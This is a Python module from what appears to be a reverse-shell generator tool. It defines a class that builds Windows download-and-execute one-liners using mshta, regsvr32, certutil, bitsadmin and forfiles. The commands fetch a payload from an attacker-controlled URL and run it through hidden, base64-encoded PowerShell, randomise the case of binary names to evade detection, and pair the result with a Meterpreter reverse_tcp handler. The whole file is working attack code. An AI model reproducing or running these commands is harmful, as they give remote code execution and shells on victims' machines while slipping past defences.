import base64
import random
import string
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, build_listener_setup

_VARIANTS = ["mshta", "regsvr32", "certutil", "bitsadmin", "forfiles"]


def _rand_ext(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _random_case(s: str) -> str:
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def _ps_download_exec_b64(url: str) -> str:
    ps = f"(New-Object Net.WebClient).DownloadString('{url}/shell.ps1')|iex"
    return base64.b64encode(ps.encode("utf-16-le")).decode()


class LOLBinsGenerator(ShellGenerator):
    language = "lolbins"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)
        url = opts.delivery_url
        tmp = _rand_ext() if names else "payload"
        note = f"Serve your payload at {url}/shell.exe (or shell.ps1)\npython3 -m http.server {opts.delivery_port}"

        if variant == "mshta":
            cmd = self._mshta(url, opts.obfuscate)
        elif variant == "regsvr32":
            cmd = self._regsvr32(url, opts.obfuscate)
        elif variant == "certutil":
            cmd = self._certutil(url, tmp, opts.obfuscate)
        elif variant == "bitsadmin":
            cmd = self._bitsadmin(url, tmp, opts.obfuscate)
        else:
            cmd = self._forfiles(url, opts.obfuscate)

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=note,
            tty_upgrade=None,
            msf_compat=msf_handler("windows/meterpreter/reverse_tcp", opts.lhost, opts.lport),
            listener_setup=build_listener_setup(opts.lhost, opts.lport),
        )

    def _mshta(self, url: str, obfuscate: bool) -> str:
        b64 = _ps_download_exec_b64(url)
        binary = _random_case("mshta.exe") if obfuscate else "mshta.exe"
        return (
            f'{binary} vbscript:Execute("CreateObject(""WScript.Shell"")'
            f'.Run(""powershell -nop -w hidden -enc {b64}"",0,True)(window.close)")'
        )

    def _regsvr32(self, url: str, obfuscate: bool) -> str:
        binary = _random_case("regsvr32.exe") if obfuscate else "regsvr32.exe"
        return f"{binary} /s /n /u /i:{url}/payload.sct scrobj.dll"

    def _certutil(self, url: str, tmp: str, obfuscate: bool) -> str:
        binary = _random_case("certutil.exe") if obfuscate else "certutil.exe"
        return (
            f"{binary} -urlcache -split -f {url}/shell.exe "
            f"%TEMP%\\{tmp}.exe && %TEMP%\\{tmp}.exe"
        )

    def _bitsadmin(self, url: str, tmp: str, obfuscate: bool) -> str:
        binary = _random_case("bitsadmin") if obfuscate else "bitsadmin"
        job = _rand_ext(6) if obfuscate else "job1"
        return (
            f"{binary} /transfer {job} {url}/shell.exe "
            f"%TEMP%\\{tmp}.exe && %TEMP%\\{tmp}.exe"
        )

    def _forfiles(self, url: str, obfuscate: bool) -> str:
        b64 = _ps_download_exec_b64(url)
        return (
            f"forfiles /p c:\\windows\\system32 /m notepad.exe /c "
            f'"cmd /c powershell -nop -w h -enc {b64}"'
        )
